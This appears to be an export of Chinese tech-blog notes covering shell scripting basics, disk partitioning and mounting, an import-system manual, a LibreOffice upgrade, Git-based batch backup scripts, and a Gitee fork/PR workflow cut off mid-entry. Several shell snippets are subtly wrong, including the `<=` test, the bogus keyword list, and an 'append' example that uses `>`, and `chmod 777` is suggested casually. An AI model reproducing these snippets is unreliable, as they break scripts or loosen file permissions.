    <title>Shell脚本编程</title>
    <url>/2020/12/03/Shell%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[
### 脚本运行环境

#### 1.脚本权限

需要当前用户有执行权限, 可以使用如下命令给当前目录下的`test.sh`添加权限

```
sudo chmod +x ./test.sh   或者 sudo chmod 777 ./test.sh
```

#### 2.运行方式

```
# 运行当前脚本, 不可直接使用 test.sh 方式运行
./test.sh				

# 选择编译器运行
/bin/sh test.sh
/bin/bash test.sh
```

> 若采用第二种方式运行脚本, 脚本第一行的解释器信息可以不写

#### 3.字符编码格式

由于windows(`\r\n`)和linux(`\n`)中定义换行方式不同,

 导致直接将windows中编写的shell脚本放入linux可能出现执行报错, 解决方式有如下几种

- vim 

  ```
  $ vi test.sh
  :set ff				# 查看编码: 显示dos
  :set ff=unix		# 转换编码为unix
  ```

- sublime编辑器

  ```
  点击 [首选项(preferences)->设置(settings)]
  在对象数组中添加:  "default_line_ending": "unix",
  ```

- Phpstorm

  ```
  点击右下角按钮, 浮现 line seperator,选择LF  (默认是CRLF)
  ```

- linux工具: dos2unix

  ```
  $ apt-get install dos2unix
  $ dos2unix ./*.sh
  ```

### 脚本编写

#### 1.指定自执行解释器

```
#!/bin/sh     首行, 指定使用的执行解释器
```

#### 2.脚本注释简介

```
##-----------------------------------------------
 # Created For Project qbweb_linux
 # Author: NI9NE
 # DateTime: 2020/11/25 11:11
 # Email: <ni9ne@outlook.com>
 # Usage: 用于每日备份新增加的文件
##-----------------------------------------------
```

#### 3.脚本命名

linux中脚本扩展名并不影响执行, 以`.sh`结尾只是为了见名知意

#### 4.简单脚本

```
#!/bin/sh
echo 'hello world!'
```

### 脚本书写规则

#### 1.变量

##### 1.1 定义/使用变量

在linux中, 变量定义不用加`$`符号, 使用时才需要

```
#!/bin/sh
string="hello world!"
echo $string # 或者
echo ${string}
```

同时, 定义变量应该注意以下几点

- 变量名只能使用英文字母，数字和下划线，首个字符不能以数字开头。

- 变量名和等号之间不能有空格

- 不可使用bash里的关键字

  ```
  包括: 
  new,open,edit,list,cd,pwd,set,clear,help,quit,ssh,telnet,rlogin,sftp,ftp,disconnect,reconnect 等
  ```

##### 1.2 只读变量/删除变量

定义只读变量, 防止后面修改, 可以使用

```
#!/bin/sh
string="hello world!"
readonly string
string="hello shell!"  # 脚本报错
```

删除变量

```
#!/bin/sh
string="hello world!"
unset string
echo ${string}		# 无任何输出
```

#### 2.字符串

##### 2.1 单双引号的区别

定义字符串时, 使用单/双引号均可, 也可以不用引号(这种情况只适用于没有空格的字符)

单引号中的字符都会原样输出,如果需要用到变量, 最好用双引号

```
#!/bin/sh
string=hello
string1="hello world!"
string2='hello world!'
combine1='${string1} welcome'  
echo ${combine1}     # 输出:  ${string1} welcome
combine2="${string1} welcome"
echo ${combine2}	 # 输出:  hello world! welcome
```

##### 2.2 反引号

在shell中, 反引号代表命令替换, 既将一个命令的标准输出插在一个命令行中任何位置, 使用`$(..)`同理

```
#!/bin/sh
string='当前用户为:'`whoami`
# 或者
string='当前用户为:'$(whoami)
echo ${string}  # 此时输出 当前用户为:ubuntu
```

#### 3.注释

##### 3.1 单行注释

以 `#` 开头的行就是注释，会被解释器忽略。

##### 3.2 多行注释

```
:<<EOF
注释内容...
注释内容...
注释内容...
EOF
```

#### 4.函数

>  使用函数, 需要注意, 函数定义必须处于调用点之前, 为方便书写, 通常将函数定义置于脚本开始部分

##### 4.1 定义函数

可以使用如下方法

```
#!/bin/bash
function testFunc(){
	...
}
# 或者
testFunc(){
 	...
}
```

##### 4.2 调用函数

直接输入函数名即可

```
#!/bin/bash
testFunc
```

##### 4.3 返回值

shell脚本中的返回值也可以定义, 但限制为在0-255的数字, 作为函数执行的状态结果

```
#!/bin/bash
testFunc(){
	echo '执行函数testFunc'
	return 0
}
testFunc
echo $?   # 输出0
```

>$? 在shell中代表上一条命令的执行返回结果, 通常0代表执行正确, 非0代表有错误, 可以通过这个验证代码的执行状态

##### 4.4 参数

函数参数并不需要再定义函数时的()中指定, 默认参数按照数字排序, 第一个参数为`${1}`, 第10个参数为`${10}`

传入参数只需要调用时, 以空格为分隔符跟在函数名后面即可

```
#!/bin/bash
testFunc(){
	echo '执行函数testFunc'
	echo ${1}
}
testFunc '参数1'  # 执行结果为输出:  执行函数testFunc /n  参数1
```

#### 5.流程控制

##### 5.1 if-else

与PHP不同, shell中的流程控制不能为空, 如果else分支没有语句执行，就不要写这个else.

```
if [ conditon ]; then
    command1 
elif [ conditon ]; then
	command2
else
	command3
fi
```

比如下面的判断目录是否存在, 不存在创建的命令

```
#!/bin/bash
if [ ! -d ${local_path} ]; then
    echo '目录不存在'
    mkdir ${local_path}
else
	echo '目录存在,无需创建'
fi
```

##### 5.2 for循环

```
#!/bin/bash
for loop in 1 2 3 4 5
do
    echo "The value is: ${loop}"
done
```

##### 5.4 while语句

```
while [ condition ]; do
	command
done
```

```
#!/bin/bash
int=1
while [ $int <= 5 ]
do
    echo $int
    int=`expr ${int} + 1`
done
```

##### 5.5 until 循环

```
until [ condition ]
do
    command
done
```

```
#!/bin/bash
a=0
until [ ! ${a} -lt 10 ]
do
   echo $a
   a=`expr ${a} + 1`
done
```

##### 5.6 case

```
case 值 in
模式1)
    command1
    ;;
模式2）
    command2
    ;;
esac
```

```
#!/bin/bash
echo '输入 1 到 4 之间的数字:'
echo '你输入的数字为:'
read aNum			# 读取用户输入
case $aNum in
    1)  echo '你选择了 1'
    ;;
    2)  echo '你选择了 2'
    ;;
    3)  echo '你选择了 3'
    ;;
    4)  echo '你选择了 4'
    ;;
    *)  echo '你没有输入 1 到 4 之间的数字'
    ;;
esac
```

##### 5.6 break/continue 跳出循环

#### 6.运算符

##### 6.1 算数运算符

原生bash不支持简单的数学运算，但是可以通过其他命令来实现，例如 awk 和 expr，expr 最常用

```
#!/bin/bash
val=`expr 2 + 2`
echo "两数之和为 : ${val}"
```

> 注意: 运算符之间必须有空格

常用运算符有: 

| 运算符 | 说明                                          | 举例                           |
| :----- | :-------------------------------------------- | :----------------------------- |
| +      | 加法                                          | `expr $a + $b` 结果为 30。     |
| -      | 减法                                          | `expr $a - $b` 结果为 -10。    |
| *      | 乘法(使用时需用`\`转义)                       | `expr $a \* $b` 结果为  200。  |
| /      | 除法                                          | `expr $b / $a` 结果为 2。      |
| %      | 取余                                          | `expr $b % $a` 结果为 0。      |
| =      | 赋值                                          | `a=$b `将把变量 b 的值赋给 a。 |
| ==     | 相等。用于比较两个数字，相同则返回 true。     | `[ $a == $b ]` 返回 false。    |
| !=     | 不相等。用于比较两个数字，不相同则返回 true。 | `[ $a != $b ] `返回 true。     |

> **注意：**条件表达式要放在方括号之间，并且要有空格，例如: `[$a==$b]` 是错误的，必须写成 `[ $a == $b ]`。

##### 6.2 关系运算符

关系运算符只支持数字，不支持字符串，除非字符串的值是数字。

下表列出了常用的关系运算符，假定变量 a 为 10，变量 b 为 20：

| 运算符 | 说明                                                  | 举例                         |
| :----- | :---------------------------------------------------- | :--------------------------- |
| -eq    | 检测两个数是否相等，相等返回 true。                   | `[ $a -eq $b ] `返回 false。 |
| -ne    | 检测两个数是否不相等，不相等返回 true。               | `[ $a -ne $b ] `返回 true。  |
| -gt    | 检测左边的数是否大于右边的，如果是，则返回 true。     | `[ $a -gt $b ] `返回 false。 |
| -lt    | 检测左边的数是否小于右边的，如果是，则返回 true。     | `[ $a -lt $b ]` 返回 true。  |
| -ge    | 检测左边的数是否大于等于右边的，如果是，则返回 true。 | `[ $a -ge $b ] `返回 false。 |
| -le    | 检测左边的数是否小于等于右边的，如果是，则返回 true。 | `[ $a -le $b ] `返回 true。  |

##### 6.3 布尔运算符

下表列出了常用的布尔运算符，假定变量 a 为 10，变量 b 为 20：

| 运算符 | 说明                                                | 举例                                       |
| :----- | :-------------------------------------------------- | :----------------------------------------- |
| !      | 非运算，表达式为 true 则返回 false，否则返回 true。 | `[ ! false ] `返回 true。                  |
| -o     | 或运算，有一个表达式为 true 则返回 true。           | `[ $a -lt 20 -o $b -gt 100 ] `返回 true。  |
| -a     | 与运算，两个表达式都为 true 才返回 true。           | `[ $a -lt 20 -a $b -gt 100 ] `返回 false。 |

##### 6.4 逻辑运算符

以下介绍 Shell 的逻辑运算符，假定变量 a 为 10，变量 b 为 20:

| 运算符 | 说明       | 举例                                        |
| :----- | :--------- | :------------------------------------------ |
| &&     | 逻辑的 AND | `[[ $a -lt 100 && $b -gt 100 ]]` 返回 false |
| \|\|   | 逻辑的 OR  | `[[ $a -lt 100 || $b -gt 100 ]]` 返回 true  |

##### 6.5 字符串运算符

下表列出了常用的字符串运算符，假定变量 a 为 "abc"，变量 b 为 "efg"：

| 运算符 | 说明                                         | 举例                       |
| :----- | :------------------------------------------- | :------------------------- |
| =      | 检测两个字符串是否相等，相等返回 true。      | `[ $a = $b ]` 返回 false。 |
| !=     | 检测两个字符串是否相等，不相等返回 true。    | `[ $a != $b ] `返回 true。 |
| -z     | 检测字符串长度是否为0，为0返回 true。        | `[ -z $a ]` 返回 false。   |
| -n     | 检测字符串长度是否不为 0，不为 0 返回 true。 | `[ -n "$a" ] `返回 true。  |
| $      | 检测字符串是否为空，不为空返回 true。        | `[ $a ]` 返回 true。       |

##### 6.6 文件测试运算符

| 操作符  | 说明                                                         | 举例                      |
| :------ | :----------------------------------------------------------- | :------------------------ |
| -b file | 检测文件是否是块设备文件，如果是，则返回 true。              | [ -b $file ] 返回 false。 |
| -c file | 检测文件是否是字符设备文件，如果是，则返回 true。            | [ -c $file ] 返回 false。 |
| -d file | 检测文件是否是目录，如果是，则返回 true。                    | [ -d $file ] 返回 false。 |
| -f file | 检测文件是否是普通文件（既不是目录，也不是设备文件），如果是，则返回 true。 | [ -f $file ] 返回 true。  |
| -g file | 检测文件是否设置了 SGID 位，如果是，则返回 true。            | [ -g $file ] 返回 false。 |
| -k file | 检测文件是否设置了粘着位(Sticky Bit)，如果是，则返回 true。  | [ -k $file ] 返回 false。 |
| -p file | 检测文件是否是有名管道，如果是，则返回 true。                | [ -p $file ] 返回 false。 |
| -u file | 检测文件是否设置了 SUID 位，如果是，则返回 true。            | [ -u $file ] 返回 false。 |
| -r file | 检测文件是否可读，如果是，则返回 true。                      | [ -r $file ] 返回 true。  |
| -w file | 检测文件是否可写，如果是，则返回 true。                      | [ -w $file ] 返回 true。  |
| -x file | 检测文件是否可执行，如果是，则返回 true。                    | [ -x $file ] 返回 true。  |
| -s file | 检测文件是否为空（文件大小是否大于0），不为空返回 true。     | [ -s $file ] 返回 true。  |
| -e file | 检测文件（包括目录）是否存在，如果是，则返回 true。          | [ -e $file ] 返回 true。  |

#### 7.输入输出重定向

| 命令            | 说明                                               |
| :-------------- | :------------------------------------------------- |
| command > file  | 将输出重定向到 file。                              |
| command < file  | 将输入重定向到 file。                              |
| command >> file | 将输出以追加的方式重定向到 file。                  |
| n > file        | 将文件描述符为 n 的文件重定向到 file。             |
| n >> file       | 将文件描述符为 n 的文件以追加的方式重定向到 file。 |
| n >& m          | 将输出文件 m 和 n 合并。                           |
| n <& m          | 将输入文件 m 和 n 合并。                           |
| << tag          | 将开始标记 tag 和结束标记 tag 之间的内容作为输入。 |

```
#!/bin/bash
echo `cat test.txt` > test2.txt   # 将test.txt内容覆盖test2.txt
echo `cat test.txt` > test3.txt   # 将test.txt内容追加test3.txt
```

##### 7.1不显示执行输出结果

```
$ command > /dev/null
```

/dev/null 是一个特殊的文件，写入到它的内容都会被丢弃；如果尝试从该文件读取内容，那么什么也读不到。但是 /dev/null 文件非常有用，将命令的输出重定向到它，会起到"禁止输出"的效果。

如果需要屏蔽输出和错误, 可以这样写

```
$ command > /dev/null 2>&1
```

> **注意：**0 是标准输入（STDIN），1 是标准输出（STDOUT），2 是标准错误输出（STDERR）。
>
> *这里的* 2 和 > 之间不可以有空格，2> 是一体的时候才表示错误输出]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>PHP</tag>
        <tag>后端</tag>
        <tag>Shell</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux扩容及挂载硬盘</title>
    <url>/2020/09/22/Linux%E6%89%A9%E5%AE%B9%E5%8F%8A%E6%8C%82%E8%BD%BD%E7%A1%AC%E7%9B%98/</url>
    <content><![CDATA[
### 环境: 

集团派发文件服务器(118)

### 问题: 

计划任务调用自动备份后, Tab键自动补全失效

### 报错: 

`cannot create temp file for here-document: No space left on device`

### 查看系统状态: 

```
ubuntu@TS-CLOUD-NFS:/var/www$ df -hl
Filesystem                         Size  Used Avail Use% Mounted on
udev                               3.9G     0  3.9G   0% /dev
tmpfs                              797M   17M  780M   3% /run
/dev/mapper/ZS--RCDT--AP--vg-root   97G   97G  0G  	  100% /
tmpfs                              3.9G     0  3.9G   0% /dev/shm
tmpfs                              5.0M     0  5.0M   0% /run/lock
tmpfs                              3.9G     0  3.9G   0% /sys/fs/cgroup
/dev/sda1                          472M   58M  390M  13% /boot
tmpfs                              797M     0  797M   0% /run/user/1000
```

```
ubuntu@TS-CLOUD-NFS:/var/www$ sudo fdisk -l | grep Disk
Disk /dev/sda: 2 TiB, 2199023255552 bytes, 4294967296 sectors
Disklabel type: dos
Disk identifier: 0x99527f79
Disk /dev/mapper/ZS--RCDT--AP--vg-root: 98.6 GiB, 105830678528 bytes, 206700544 sectors
Disk /dev/mapper/ZS--RCDT--AP--vg-swap_1: 980 MiB, 1027604480 bytes, 2007040 sectors
```

### 分析: 

当前环境下使用硬盘`2TB`, 但实际使用的只有`100G`, 其余空间未挂载

### 对策: 

创建新分区, 并挂载使用

#### 1.创建新分区

```
$ sudo fdisk /dev/sda
> m    						#(获取帮助)
> print						#(打印现状)
    Device     Boot   Start       End   Sectors  Size Id Type
    /dev/sda1  *       2048    999423    997376  487M 83 Linux
    /dev/sda2       1001470 209713151 208711682 99.5G  5 Extended
    /dev/sda3        999424   1001469      2046 1023K 83 Linux
    /dev/sda5       1001472 209713151 208711680 99.5G 8e Linux LVM
> n							#(创建新分区)
  Partition type
   p   primary (2 primary, 1 extended, 1 free)
   l   logical (numbered from 5)
  Select (default p): p
  Selected partition 4
  First sector (209713152-4294967295, default 209713152):
  Last sector, +sectors or +size{K,M,G,T,P} (209713152-4294967294, default 4294967294): +1.2T
  Created a new partition 4 of type 'Linux' and of size 1.2 TiB.
> print						#(打印现状)
  	Device     Boot     Start        End    Sectors  Size Id Type
    /dev/sda1  *         2048     999423     997376  487M 83 Linux
    /dev/sda2         1001470  209713151  208711682 99.5G  5 Extended
    /dev/sda3          999424    1001469       2046 1023K 83 Linux
    /dev/sda4       209713152 2776627199 2566914048  1.2T 83 Linux
    /dev/sda5         1001472  209713151  208711680 99.5G 8e Linux LVM
> w							#(写入保存退出)
```

>若有红色报警
>
>```
>The size of this disk is 2 TiB (2199023255552 bytes). DOS partition table format can not be used on drives for volumes larger than 2199023255040 bytes for 512-byte sectors. Use GUID partition table format (GPT).
>```
>
>解决
>
>```
>- 如果系统盘在该盘上(仅创建新分区)
>sudo parted /dev/sda
>> mkpart
>> primary
>> ext4
>> 300GB
>> 1900GB
>> quit
>sudo partprobe  # 刷新
>sudo mkfs -t ext4 /dev/sda3
>
>
>- 如果为空初始盘,(格式化盘,并创建新分区)可操作如下:
>sudo parted /dev/sda #进入parted 
>mklabel gpt #将磁盘设置为gpt格式，
>mkpart logical 0 -1 #将磁盘所有的容量设置为GPT格式
>print #查看分区结果
>
>这个时候应该是默认进行分了一个/dev/sda1这个分区
>然后退出parted，在终端输入 sudo mkfs -t ext4 /dev/sda1 
>将刚刚分出来的sda1格式化为ext4的格式，然后就可以设置开机自动挂载了。
>```
>
>
>
>

#### 2.将新分区格式化为ext4

```
$ sudo mkfs -t ext4 /dev/sda4
```

> 若报错: 
>
> ```
> The file /dev/vda3 does not exist and no size was specified
> ```
>
> 解决:
>
> ```
> 查看文件:
> $ ls -l /dev/sda*
>  brw-rw---- 1 root disk 8, 0 Nov 19 15:02 /dev/sda
>  brw-rw---- 1 root disk 8, 1 Nov 19 15:02 /dev/sda1
>  brw-rw---- 1 root disk 8, 2 Nov 19 15:02 /dev/sda2
>  brw-rw---- 1 root disk 8, 3 Nov 19 15:02 /dev/sda3
>  brw-rw---- 1 root disk 8, 5 Nov 19 15:02 /dev/sda5
> 原因为系统未读取分区信息, 执行以下命令重新生成
> $ sudo partprobe
> ```

#### 3.创建挂载点, 挂载分区

```
$ sudo mkdir /var/www/LocalCFS
$ sudo mount /dev/sda4 /var/www/LocalCFS
```

#### 4.查看挂载状况

```
ubuntu@TS-CLOUD-NFS:/var/www$ df -hl
Filesystem                         Size  Used Avail Use% Mounted on
udev                               3.9G     0  3.9G   0% /dev
tmpfs                              797M   17M  780M   3% /run
/dev/mapper/ZS--RCDT--AP--vg-root   97G   88G  4.3G  96% /
tmpfs                              3.9G     0  3.9G   0% /dev/shm
tmpfs                              5.0M     0  5.0M   0% /run/lock
tmpfs                              3.9G     0  3.9G   0% /sys/fs/cgroup
/dev/sda1                          472M   58M  390M  13% /boot
tmpfs                              797M     0  797M   0% /run/user/1000
/dev/sda4                          1.9T   67M  1.8T   1% /var/www/LocalCFS
```

#### 5.配置自动挂载

```
$ sudo blkid			#(查看分区ID)

/dev/sda4: UUID="ca6874b1-60b1-4864-a8cd-c5eff3075395" TYPE="ext4"
```

```
$ sudo vi /etc/fstab
最后面添加:
UUID=ca6874b1-60b1-4864-a8cd-c5eff3075395 /var/www/LocalCFS  ext4  defaults    1    2
/dev/sda3 /var/www ext4 defaults 0 0 
```





]]></content>
      <categories>
        <category>开发资料</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>PHP</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>导入导出系统使用手册</title>
    <url>/2020/05/22/%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C/%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA%E7%B3%BB%E7%BB%9F%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/</url>
    <content><![CDATA[
导入系统是作为项目初始化或批量数据生成的一种方式, 将符合格式的数据批量导入项目数据库, 通常只有管理员才可以操作, 入口如下:

![1592370680273](/images/imgs/导入导出系统使用手册/1592370680273.png)

### 注意事项:

#### 1.请使用导入样板

系统导入应使用【导入样板】, 非系统导入样板格式的Excel无法导入数据:

![1592370897448](/images/imgs/导入导出系统使用手册/1592370897448.png)

#### 2.导入样板使用

点击【导入样板】后, 选择需要导入的模块(主表或子表), 第一个总为主表, 点击确定, 即可导出模板文件

![1592371007355](/images/imgs/导入导出系统使用手册/1592371007355.png)

#### 3.导入样板格式讲解

【导入样板】的格式如下， **第一行** 为系统内部对应的字段名， **第二行** 为对应的中文名， 也就是系统中显示的名称， 在对应的字段下填入数据 .

【导入样板】中的字段为系统允许导入的所有字段, **视图列** 和**无导入 **字段不在其中, 如果某个字段下没有数据或置空, 系统默认 **不导入** 该条数据的该字段

> 注意: 导入时最好检查数据格式是否为文本格式
>
> 例如: 15100，100.11  为货币格式数据, 导入数据库时可能会失败, 修改为15100100.11即可

![1592371132605](/images/imgs/导入导出系统使用手册/1592371132605.png)

#### 4.导入--字段检查

导入时, 首先会判断**模板中字段是否属于该模块**, 如果不存在该字段, 则会报错如下:

![1592371670842](/images/imgs/导入导出系统使用手册/1592371670842.png)

![1592371687035](/images/imgs/导入导出系统使用手册/1592371687035.png)

#### 5.导入--视图列/无导入字段检测

导入时, 会判断字段中**是否有用户自己添加的字段** (视图列/无导入), 若存在, 会有如下报错:

![1592371835238](/images/imgs/导入导出系统使用手册/1592371835238.png)

![1592371842702](/images/imgs/导入导出系统使用手册/1592371842702.png)

#### 6.导入--关联数据预查询

导入时, 如果有关联字段, 会先查询**导入的数据**是否在对应模块中**存在**, 如果不存在, 会有如下报错:

> 关联字段导入既可以导入显示中文字, 也可以导入对应的真实存储值, 但不能同时使用
>
> 若采用显示值导入, 当显示值对应的真实值有多个时, 会提示: [存在多个关联的数据, 请使用真实关联值方式导入]

![1592374878840](/images/imgs/导入导出系统使用手册/1592374878840.png)

![1592375037592](/images/imgs/导入导出系统使用手册/1592375037592.png)

![1592375141927](/images/imgs/导入导出系统使用手册/1592375141927.png)

#### 7.导入--导入数据转化

导入时, 会对数据做处理如下:

英文格式的单引号`'`, 双引号`"`,逗号`,`, 会自动转化为中文格式, 

除了大文本格式的数据之外, 其他格式数据中的回车换行会自动转化为空格,

货币格式和整数类型的数据, 其中的逗号(中英文) 会被删除

数据结尾出现的反斜线`\`会被去除

#### 8.导入--数据检测_外键

导入子表时, 若没有所在**主表的编号**, 会有如下提示:

![1592376007223](/images/imgs/导入导出系统使用手册/1592376007223.png)

#### 9.导入--数据检测_主键

##### 1.非本站点数据

- 导入数据如果包含**主键编号**, 则系统会从数据库中检索是否有该条数据, 若该编号**不属于本站点**, 有如下提示:

  ![1592376266692](/images/imgs/导入导出系统使用手册/1592376266692.png)

##### 2.更新数据_流程锁定

- 如果该条数据主键编号**存在**, 系统默认**修改** 

  - 如果该条数据已经有审批流程, 即在审批中或已归档, 除管理员角色外, 无法导入该条数据

    ![1592376530653](/images/imgs/导入导出系统使用手册/1592376530653.png)

##### 3.新增数据

- 如果该条数据主键编号**不存在**, 系统默认**新增** 

#### 10.导入结果

导入完成后, 右下方会出现导入**结果弹窗**

![1592376717559](/images/imgs/导入导出系统使用手册/1592376717559.png)

 点击详情可以查看具体导入内容

![1592376808171](/images/imgs/导入导出系统使用手册/1592376808171.png)

]]></content>
      <categories>
        <category>开发手册</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>后端</tag>
        <tag>项目</tag>
      </tags>
  </entry>
  <entry>
    <title>Libreoffice升级指南</title>
    <url>/2021/01/15/Libreoffice%E5%8D%87%E7%BA%A7%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[
由于低版本libreoffice转化PDF时, 会存在样式错误, 需要提高到6.4以上才能避免

如果服务器已有libreoffice, 可通过命令查看版本`soffice --version` 或 `libreoffice --version`

```
升级命令: 
 sudo add-apt-repository ppa:libreoffice/ppa
 sudo apt update
 sudo apt-get install -y libreoffice
 该命令为完整安装升级, 大约占用250M空间, 可酌情使用(推荐)
```

```
手动安装
- 访问网址 , 下载最新安装包 
https://www.libreoffice.org/download/download/
移动安装包到服务器, 执行解压安装命令
或
- 命令下载
1: wget https://mirrors.nju.edu.cn/tdf/libreoffice/stable/7.0.4/deb/x86_64/LibreOffice_7.0.4_Linux_x86-64_deb.tar.gz

2: wget https://download.documentfoundation.org/libreoffice/stable/7.0.4/deb/x86_64/LibreOffice_7.0.4_Linux_x86-64_deb.tar.gz

```

```shell
安装
tar zxvf LibreOffice_$version_Linux_x86-deb.tar.gz 
cd LibreOffice_$version_Linux_x86-deb/DEBS
sudo dpkg -i *.deb
```

]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>后端</tag>
        <tag>LibreOffice</tag>
      </tags>
  </entry>
  <entry>
    <title>Bat脚本编写用例</title>
    <url>/2021/05/07/Bat%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E7%94%A8%E4%BE%8B/</url>
    <content><![CDATA[
## 一次Bat脚本的尝试

记录一次Bat脚本的编写使用,

本意是在Windows服务器上用Git实现文件的备份和实时拉取, 但由于仓库的大小限制失败, 改为其他方式实现, 以下为具体bat脚本代码



### 1_rar_gitpush.bat

```powershell
@echo on

rem 设置运行脚本变量
:::: 压缩执行文件路径
set rar_exe="C:\Program Files\WinRAR\Rar.exe"
:::: 文件压缩拆分大小
set file_size=49m
:::: SQL自动备份文件夹路径,要带\
set sql_back_file_path=F:\BashTest\sqlfile\
::::上传git仓库文件夹路径,要带\
set git_file_path=F:\BashTest\filename3\
::::git拉取同步分支
set git_branck=master

:: 创建日志文件
set dir_path=%~dp0
set log_path=%dir_path%push_log.txt
set now_time=%date:~0,4%-%date:~5,2%-%date:~8,2% %time:~0,2%:%time:~3,2%:%time:~6,2%  

echo %log_path%
if not exist %log_path% (
		echo "Backup Log">%log_path%
	)



rem 拉取最新代码
cd %git_file_path%
if %errorlevel% neq 0 goto fail
git reset --hard
if %errorlevel% neq 0 goto fail
git fetch --all
if %errorlevel% neq 0 goto fail
git pull origin %git_branck%
::if %errorlevel% neq 0 goto fail


:::: 删除obj文件
rem rd /s /q .git\objects 
rem if %errorlevel% neq 0 goto fail
rem md .git\objects
rem if %errorlevel% neq 0 goto fail
rem rd /s /q .git/refs/original/
rem if %errorlevel% neq 0 goto fail
rem git reflog expire --expire=now --all
rem git gc --prune=now

rem 删除原有数据
del filefolder\*.rar
if %errorlevel% neq 0 goto fail
git add . 
::if %errorlevel% neq 0 goto fail
git commit -m "daily backup clean"
::if %errorlevel% neq 0 goto fail
git push origin %git_branck%:%git_branck%
::if %errorlevel% neq 0 goto fail



rem rem 清除大文件
::git filter-branch --index-filter "git rm --cached --ignore-unmatch *" -- --all
git filter-branch --force --index-filter "git rm -r --cached --ignore-unmatch filefolder" --prune-empty --tag-name-filter cat -- --all
rd /s /q .git\refs\original\
if %errorlevel% neq 0 goto fail
rd /s /q .git\logs\
if %errorlevel% neq 0 goto fail
git reflog expire --expire=now --all
if %errorlevel% neq 0 goto fail
git gc --prune=now --aggressive
if %errorlevel% neq 0 goto fail
git add .
git commit -m "data clean"
git push origin --force --all
::if %errorlevel% neq 0 goto fail
rem rem 清空分支
rem git checkout %git_branck%
rem if %errorlevel% neq 0 goto fail
rem git checkout --orphan master-new-line;
rem if %errorlevel% neq 0 goto fail
rem git add -A
rem if %errorlevel% neq 0 goto fail
rem git commit -am "init project"
rem if %errorlevel% neq 0 goto fail
rem git branch -D %git_branck%
rem if %errorlevel% neq 0 goto fail
rem git branch -m %git_branck%
rem if %errorlevel% neq 0 goto fail
rem git push -f origin %git_branck%:%git_branck%
rem if %errorlevel% neq 0 goto fail


rem git pack-refs --all --prune
rem git reflog expire --all
rem git repack -d -l
rem git prune --expire
rem git rerere gc

rem git checkout -b %git_branck%
rem git fetch --all

rem 分卷压缩指定文件夹内文件
:started
set now_day_format=%date:~0,4%_%date:~5,2%_%date:~8,2%
%rar_exe% a -m5 -v%file_size% -ta%now_day_format% -agYYYYMMDD %git_file_path%filefolder\ %sql_back_file_path%
if %errorlevel% neq 0 goto fail

rem 提交gitee
:gitpush
cd %git_file_path%
if %errorlevel% neq 0 goto fail
git add .
if %errorlevel% neq 0 goto fail
git commit -m "daily backup"
if %errorlevel% neq 0 goto fail
git push origin %git_branck%:%git_branck%
if %errorlevel% neq 0 goto fail

rem rem 上传完毕,清空仓库
rem :dellocal
rem del filefolder\*.rar
goto success

:fail
echo %now_time%%now_day_format%" daily backup failed">>%log_path%
echo "daily backup failed,please retry later!" && goto exited

:success
echo %now_time%%now_day_format%" daily backup success">>%log_path%
echo "backup success" && goto exited

:exited
pause
exit

```

### 2_gitpull_move.bat

```powershell
@echo off

rem 设置运行脚本变量

::::下载git仓库文件夹路径,要带\
set git_file_path=F:\BashTest\filename3\
::::本地存储文件夹路径,要带\
set storage_file_path=F:\BashTest\filename2\
::::git拉取同步分支
set git_branck=file

:: 创建日志文件
set dir_path=%~dp0
set log_path=%dir_path%pull_log.txt
set now_time=%date:~0,4%-%date:~5,2%-%date:~8,2% %time:~0,2%:%time:~3,2%:%time:~6,2%  

echo %log_path%
if not exist %log_path% (
		echo "Backup Pull Log">%log_path%
	)

rem 拉取最新代码
cd %git_file_path%
if %errorlevel% neq 0 goto fail

git reset --hard
if %errorlevel% neq 0 goto fail

git fetch --all
if %errorlevel% neq 0 goto fail

git pull origin %git_branck%
if %errorlevel% neq 0 goto fail

rem 移动到备份
:movefile
move %git_file_path%\test\* %storage_file_path%
if %errorlevel% neq 0 goto fail
goto success

:fail
echo %now_time%" daily backup pull failed">>%log_path%
echo "daily backup failed,please retry later!" && goto exited

:success
echo %now_time%" daily backup pull success">>%log_path%
echo "backup success" && goto exited

:exited
pause
exit
```









]]></content>
      <categories>
        <category>实际演练</category>
      </categories>
      <tags>
        <tag>后端</tag>
        <tag>Bat</tag>
      </tags>
  </entry>
  <entry>
    <title>码云 Fork+PR 模式使用流程</title>
    <url>/2020/10/05/Gitee%20%E7%A0%81%E4%BA%91Fork+PR%E6%A8%A1%E5%BC%8F%E4%BD%BF%E7%94%A8%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[
## 码云 Fork+PR 模式使用流程

流程图展示

![image-20200915122128429](/images/imgs/gitee/image-20200915122128429.png)

## 一.拉取仓库

### 1.加入项目组. fork项目源仓库

![image-20200915104911706](/images/imgs/gitee/image-20200915104911706.png)

### 2.本地Clone拷贝项目

![image-20200914181253718](/images/imgs/gitee/image-20200914181253718.png)

### 3.添加源项目Remote

#### -git bash 操作 (二选一)

`git remote add resource https://gitee.com/NI9NE/laravel_permission_test.git` 

`git remote add [自定义远端名称,类似于origin] [源Fork仓库url/路径]` 

#### -sourcetree操作 (二选一)

- 点击**设置** 

  ![image-20200914181550749](/images/imgs/gitee/image-20200914181550749.png)

- 点击**添加** 

  ![image-20200914181620180](/images/imgs/gitee/image-20200914181620180.png)

- **填写**remote信息

  ![image-20200914181757757](/images/imgs/gitee/image-20200914181757757.png)

- 完成后**显示** 

  ![image-20200914182016101](/images/imgs/gitee/image-20200914182016101.png)

### 4.拉取最新远端信息

- 点击**获取** 

  ![image-20200914182334388](/images/imgs/gitee/image-20200914182334388.png)

- 确认勾选, 点击**确定** 

  ![image-20200914182358232](/images/imgs/gitee/image-20200914182358232.png)

- 显示远端分支与最新提交记录

  ![image-20200914182432946](/images/imgs/gitee/image-20200914182432946.png)

## 二.基于dev分支开发

### 1.获取远端origin/dev分支

